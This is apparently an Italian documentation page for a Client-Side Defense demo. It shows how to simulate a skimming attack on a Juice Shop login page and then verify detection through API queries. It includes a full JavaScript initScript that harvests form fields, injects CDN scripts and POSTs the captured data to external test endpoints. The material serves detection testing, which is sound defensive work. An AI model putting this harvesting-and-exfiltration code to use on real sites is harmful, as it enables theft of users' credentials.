Fase 2 genera traffico di attacco simulato contro l'applicazione protetta e conferma che CSD lo ha rilevato. Fase 1 deve essere completa — tutti i controlli Step 7 devono essere PASS — prima di procedere.

## Step 8: Simulazione dell'Attacco

<Aside type="note">
Questo passaggio richiede l'esecuzione di JavaScript lato browser — `curl` non può attivare il rilevamento CSD. Gli assistenti AI con strumenti di automazione del browser (MCP Chrome DevTools, Playwright, Puppeteer) eseguono questi passaggi direttamente utilizzando la sequenza **AI-Automated Execution** di seguito. Gli operatori senza automazione del browser eseguono i passaggi manuali.
</Aside>

Dopo che l'infrastruttura è stata verificata (tutti i controlli Phase 1 Step 7 sono PASS), esegui gli script di simulazione dell'attacco per generare i rilevamenti CSD. Gli script sono definiti nella guida [Trigger Detection](/csd/trigger-detection/) e nella [Attack Script Library](/csd/attack-scripts/).

### AI-Automated Execution

Gli assistenti AI con strumenti di automazione del browser eseguono la simulazione dell'attacco programmaticamente:

1. **Naviga con initScript** — naviga prima a `about:blank` per assicurare un contesto di documento pulito (evita gli initScript obsoleti dalle navigazioni precedenti), quindi `navigate_page` a `http://$F5XC_DOMAINNAME/#/login` con un `initScript` che salva i nativi `setInterval`, `clearInterval`, `fetch`, e `console.log` prima che zone.js li applichi, esegue il polling per i campi del modulo di accesso, compila le credenziali tramite il setter nativo `HTMLInputElement.prototype.value`, ed esegue immediatamente lo Combined Detection Script inline. Utilizza lo script initScript verbatim di seguito.
2. **Elimina il banner di benvenuto** — `press_key` con `Escape` per chiudere il banner di benvenuto. Alle visite successive il banner potrebbe non comparire (cookie persistiti). La finestra di dialogo del consenso dei cookie viene chiusa automaticamente dal tasto Escape
3. **Attendi il completamento** — attendi 10 secondi per il completamento di tutti i callback di caricamento/errore dello script CDN e le risoluzioni delle promesse fetch
4. **Cattura l'evidenza** — `list_console_messages` per verificare la presenza di `[CSD Demo] Simulation complete` e i risultati del caricamento CDN; `list_network_requests` filtrato per i tipi `script` e `fetch` per verificare i codici di stato HTTP (`200`/`201` per il successo, `pending` per le richieste in sospeso)

**Phase 2 initScript (verbatim — utilizzare esattamente come scritto):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**Incompatibilità con zone.js** — Juice Shop utilizza zone.js di Angular, che applica patch a `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest` e altri API del browser. Questo interrompe gli strumenti `evaluate_script`, `fill`, e `click` di MCP con `Cannot read properties of undefined (reading 'call')`. Utilizza invece `navigate_page` con `initScript` — `initScript` si esegue prima che zone.js si carichi, quindi puoi salvare i riferimenti alle API native e utilizzarli nei callback di polling. L'initScript deve compilare i campi del modulo utilizzando il setter nativo `HTMLInputElement.prototype.value` (non `fill`) ed eseguire lo script di rilevamento inline (non tramite `setTimeout`, che zone.js potrebbe intercettare dopo il caricamento della pagina). Vedi [Trigger Detection — AI-Automated Execution](/csd/trigger-detection/#ai-automated-execution) per i dettagli.
</Aside>

<Aside type="note">
**Accumulo di initScript** — ogni chiamata `navigate_page` con parametro `initScript` aggiunge lo script a un elenco persistente che si esegue ad ogni caricamento di documento successivo. Per evitare che gli script obsoleti interferiscano, naviga a `about:blank` tra le esecuzioni oppure utilizza `new_page` con `isolatedContext` per un contesto del browser pulito.
</Aside>

<Aside type="note">
**Salvataggio del nativo `fetch` nell'initScript** — l'initScript salva `window.fetch.bind(window)` prima che zone.js lo applichi. Questo assicura che le chiamate fetch funzionino correttamente senza errori `Cannot read properties of undefined` di zone.js. Lo stesso initScript (con `fetch` nativo salvato) viene utilizzato sia per le esecuzioni di attacco della Fase 2 che della Fase 3 — la mitigazione CSD non intercetta le chiamate `fetch()`, quindi salvare il riferimento nativo non influisce sul comportamento di mitigazione.
</Aside>

<Aside type="caution">
**Origine 404 transitoria** — alla prima navigazione verso l'applicazione Angular, `polyfills.js` o altri script dell'app possono restituire un HTTP 404 transitorio dal server di origine. Questo causa il fallimento del bootstrapping di Angular, risultando in una pagina vuota senza modulo di accesso. Il 404 è effimero — le richieste successive restituiscono 200 o 304. **Recupero:** naviga a `about:blank`, attendi 2 secondi, quindi riprova la navigazione. Se il problema persiste su più tentativi, verifica lo stato di salute dell'origine tramite il percorso del bilanciamento del carico (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`).
</Aside>

### Manual Execution

Gli operatori senza strumenti di automazione del browser eseguono i passaggi manualmente:

1. **Naviga** alla pagina di accesso dell'applicazione protetta: `http://xF5XC_DOMAINNAMEx/#/login`
2. **Inserisci credenziali fittizie** — digita `test@example.com` nel campo Email e `P@ssword123` nel campo Password (non inviare il modulo)
3. **Apri DevTools** — premi **F12** e passa alla scheda **Console**
4. **Esegui lo Combined Detection Script** — incolla lo script da [Trigger Detection &mdash; Run the Combined Simulation Script](/csd/trigger-detection/#run-the-combined-simulation-script) nella console e premi Invio
5. **Verifica l'output della console** — conferma che l'output per fasi di `[CSD Demo]` mostra: raccolta di campi del modulo, iniezione di script da 4 domini CDN ed esfiltrazione di dati a 2 endpoint

### What Gets Triggered

| Signal | Behavior | Detection |
| --- | --- | --- |
| Form field harvesting | Legge i valori dei campi di input email e password | Script che leggono i campi del modulo sensibili — contrassegnati ad alto rischio |
| Script injection | Inietta 4 tag `&lt;script&gt;` da `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | Fino a 4 nuovi domini di script di terze parti rilevati (la disponibilità dei CDN varia) |
| Data exfiltration | Invia dati raccolti tramite `fetch` a `www.httpbin.org` e `jsonplaceholder.typicode.com` | Chiamate di rete a domini esterni |

<Aside type="note">
**La disponibilità dei CDN varia.** Non tutti i 4 script CDN si caricheranno in ogni esecuzione — i limiti di risorse del browser, le condizioni di rete o la limitazione del CDN potrebbero causare il fallimento di alcuni con `ERR_INSUFFICIENT_RESOURCES` o timeout. La simulazione ha successo se **qualsiasi** script CDN si carica. CSD rileva il tentativo di iniezione indipendentemente dal fatto che lo script si carichi con successo — la creazione stessa del tag `&lt;script&gt;` è il segnale di rilevamento.

In casi gravi, `ERR_INSUFFICIENT_RESOURCES` può esacerbare fino a un fallimento a livello di pagina — l'intera pagina diventa vuota, i timeout degli screenshot e `take_snapshot` fallisce. Questo di solito si verifica dopo che più navigazioni con initScript pesanti si accumulano nello stesso contesto del browser. **Recupero:** utilizza `new_page` con `isolatedContext` per creare un contesto del browser pulito, quindi riprova dalla sequenza `about:blank` → `navigate_page` con initScript. Questo è distinto dai fallimenti dei singoli script CDN, che non influiscono sul successo della simulazione.
</Aside>

<Aside type="tip">
Dopo aver eseguito la simulazione dell'attacco, utilizza questo ciclo di polling deterministico per attendere i rilevamenti:

1. Interroga `/detected_domains` ogni 60 secondi
2. Se DET-3 passa (i domini di esfiltrazione compaiono in `/detected_domains`), procedi al Step 9 immediatamente
3. Se ancora vuoto dopo 10 query (10 minuti), verifica lo stato di CSD (Phase 1 Step 5) e la registrazione del dominio protetto (Phase 1 Step 6) — uno di questi è probabilmente configurato erroneamente
4. Se ancora vuoto dopo 30 query (30 minuti), interrompi e segnala all'operatore — non procedere alla Fase 3

Per simulazioni mirate aggiuntive (categorie di attacco individuali, test di stress di rilevamento massimo), vedi [Attack Script Library](/csd/attack-scripts/).
</Aside>

### Evidence

L'assistente AI dovrebbe segnalare quanto segue. Per l'esecuzione automatizzata AI, l'evidenza viene catturata programmaticamente tramite `list_console_messages` (la funzione di polling dell'initScript registra i risultati nella console). Per l'esecuzione manuale, l'operatore legge l'output della console del browser.

| Check | Expected | Status |
| --- | --- | --- |
| Login page loaded | `200 OK` a `http://$F5XC_DOMAINNAME/#/login` | PASS / FAIL |
| Console script executed | `[CSD Demo] Simulation complete` nell'output della console | PASS / FAIL |
| Fields harvested | Conteggio > 0 nell'output della console | PASS |
| Scripts injected | 1–4 domini CDN nell'output della console (alcuni potrebbero fallire con errori di risorse) | PASS se compare qualsiasi dominio CDN |
| Exfil channels | 2 tentativi fetch POST nell'output della console | PASS |

<Aside type="tip">
Se il certificato HTTPS LB è valido (`CertificateValid`), puoi facoltativamente eseguire la simulazione anche contro `https://$F5XC_DOMAINNAME/#/login`. Questo non è obbligatorio per la progressione della demo.
</Aside>

## Step 9: Verifica del Rilevamento tramite API

Interroga gli endpoint dell'API CSD per confermare che i rilevamenti sono stati registrati. Utilizza il ciclo di polling: interroga `/detected_domains` ogni 60 secondi; procedi non appena DET-3 passa. Se DET-3 non passa dopo 10 minuti, verifica la configurazione di CSD. Se DET-3 non passa dopo 30 minuti, interrompi e segnala all'operatore. Questi endpoint sono documentati in [API Reference](/csd/api-reference/) e utilizzano la stessa autenticazione e namespace dei passaggi precedenti.

<Aside type="note">
**Ordine di elaborazione dell'endpoint:** `/detected_domains` viene popolato per primo ed è l'indicatore principale che la pipeline CSD funziona. `/scripts` e `/formFields` vengono popolati su un programma di elaborazione del backend più lento e potrebbero rimanere vuoti per 20–30 minuti anche dopo più esecuzioni di simulazione. Se `/detected_domains` mostra domini di esfiltrazione (`www.httpbin.org`, `jsonplaceholder.typicode.com`), tratta la simulazione come rilevata con successo e procedi — il controllo DET-1 di seguito riflette questo.
</Aside>

### Detected Scripts

Interroga gli script rilevati nelle ultime 24 ore:

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| Field | Expected | Status |
| --- | --- | --- |
| `total` | > 0 (script rilevati) | PASS se > 0; PENDING se 0 ma `/detected_domains` mostra domini di esfiltrazione |
| Script names | Include domini CDN (`cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`) in `script_name` | PASS se i domini CDN iniettati compaiono |

### Detected Domains

| Field | Expected | Status |

| Domain list | Include domini CDN e di esfiltrazione | PASS se compaiono i domini previsti |

### Form Fields

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| Field | Expected | Status |
| --- | --- | --- |
| `total` | > 0 | PASS se > 0; PENDING se 0 ma DET-3 passa |
| `name` | Include `email`, `password` | PASS se i campi sensibili compaiono |
| `sensitivity` | `Sensitive` per i campi email/password | PASS se ML ha classificato correttamente |

<Aside type="note">
**L'elaborazione dei campi del modulo è più lenta del rilevamento dei domini.** L'endpoint `/formFields` potrebbe restituire i campi con metadati parziali alla prima query. La classificazione della sensibilità ML (`Sensitive` vs `Not Sensitive`) viene popolata dopo il completamento dell'elaborazione del backend — questo può richiedere 20–30 minuti dopo la prima esecuzione di simulazione. Se i campi compaiono ma mancano della classificazione, richiedi più tardi. DET-3 (`/detected_domains`) è il criterio di passaggio primario.
</Aside>

### Phase 2 Evidence Summary

Dopo tutte le query di rilevamento, presenta lo stato di rilevamento finale:

| Test ID | Check | Status |
| --- | --- | --- |
| DET-1 | Script rilevati (endpoint `/scripts`) | PASS se > 0; PENDING se vuoto ma DET-3 passa |
| DET-2 | Domini CDN rilevati | PASS / FAIL |
| DET-3 | Domini di esfiltrazione rilevati (`/detected_domains`) | **Indicatore primario** — PASS se compaiono `www.httpbin.org` o `jsonplaceholder.typicode.com` |
| DET-4 | Campi del modulo rilevati (endpoint `/formFields`) | PASS se > 0; PENDING se vuoto ma DET-3 passa |

<Aside type="note">
**Criteri di passaggio minimo per procedere alla Fase 3:** DET-3 deve essere PASS (domini di esfiltrazione visibili in `/detected_domains`). DET-1 e DET-4 potrebbero mostrare PENDING al primo utilizzo o dopo una ricostruzione pulita — questo è normale. Se DET-3 mostra anche FAIL dopo 30 minuti, verifica che CSD sia abilitato (Phase 1 Step 5), che il dominio protetto sia registrato (Phase 1 Step 6), e che il tag JS di CSD sia iniettato (controllo JS Configuration di Phase 1 Step 7).
</Aside>
